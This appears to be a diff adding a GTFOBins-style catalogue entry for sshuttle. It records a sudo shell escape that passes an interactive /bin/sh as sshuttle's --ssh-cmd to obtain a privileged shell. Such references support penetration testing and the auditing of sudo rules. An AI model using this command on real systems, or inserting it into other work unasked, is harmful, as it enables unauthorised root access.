@@ -1,0 +1,8 @@
+---
+functions:
+  shell:
+  - code: |-
+      sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
+    contexts:
+      sudo:
+...
